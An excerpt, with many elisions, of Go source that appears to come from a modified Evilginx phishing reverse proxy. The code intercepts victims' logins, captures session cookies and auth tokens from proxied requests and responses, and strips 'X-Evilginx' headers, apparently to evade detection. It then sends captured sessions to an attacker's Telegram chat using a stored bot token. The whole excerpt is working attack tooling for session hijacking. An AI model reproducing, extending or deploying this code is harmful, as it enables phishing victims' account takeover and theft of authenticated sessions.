...
// req.Header.Set(p.getHomeDir(), o_host)
					...
					if err == nil {
						...
						if json_re.MatchString(contentType) {
							...
							// notification deferred to response handler where tokens are available
						_ = trigger
				...
				if pl != nil && ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						for _, ck := range req.Cookies() {
							...
							if strings.Contains(c_domain, ":") {
								c_domain, _, _ = net.SplitHostPort(c_domain)
							}

							orig_domain, ok := p.replaceHostWithOriginal(c_domain)
							if !ok {
								orig_domain = c_domain
							}

							if orig_domain != "" && orig_domain[0] != '.' {
								orig_domain = "." + orig_domain
							}
							log.Debug("request cookie: name=%s domain=%s orig_domain=%s", ck.Name, c_domain, orig_domain)
							at := pl.getAuthToken(orig_domain, ck.Name)
							if at != nil {
								if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
									log.Success("[%d] captured cookie from request: %s domain=%s", ps.Index, ck.Name, orig_domain)
									s.AddCookieAuthToken(orig_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								}
							}
						}
					}
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			// Proactive removal of any custom headers that might start with X-Evilginx
			for h := range resp.Header {
				if strings.HasPrefix(strings.ToLower(h), "x-evilginx") {
					resp.Header.Del(h)
				}
			}
			...
			for _, ck := range cookies {
				...
				if pl != nil && ps.SessionId != "" {
					...
					store_domain := c_domain
					if store_domain != "" && store_domain[0] != '.' {
						store_domain = "." + store_domain
					}
					log.Debug("response cookie: name=%s domain=%s", ck.Name, c_domain)
					at := pl.getAuthToken(store_domain, ck.Name)
					if at != nil {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
								log.Success("[%d] captured cookie from response: %s domain=%s", ps.Index, ck.Name, store_domain)
								s.AddCookieAuthToken(store_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								trigger = 1
							}
						}
					}
			...
			// capture cookies from request headers (for existing sessions)
			for _, ck := range resp.Request.Cookies() {
				if pl != nil && ps.SessionId != "" {
					...
					if at != nil {
						...
						if ok && (s.IsAuthUrl || !s.IsDone) {
							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
								log.Success("[%d] captured cookie from request-in-response: %s domain=%s", ps.Index, ck.Name, orig_domain)
								s.AddCookieAuthToken(orig_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
								trigger = 1
							}
						}
				...
				if ok && !s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							log.Debug("auth_url match in OnResponse: path=%s username=%s tokens=%d", resp.Request.URL.Path, s.Username, len(s.CookieTokens))
							if s.Username != "" || len(s.CookieTokens) > 0 {
								s.Finish(true)
			...
			if pl != nil && ps.SessionId != "" {
				s, ok := p.sessions[ps.SessionId]
				if ok && s.IsDone {
					log.Important("[%d] session is done (IsDone=true), checking for redirection", ps.Index)
			...
			if trigger == 1 {
				if s, ok := p.sessions[ps.SessionId]; ok {
					...
					NotifyDirect(s, ps.Index, pl_name, s.LandingURL, p.cfg.general.Chatid, p.cfg.general.Teletoken)
				}
			}
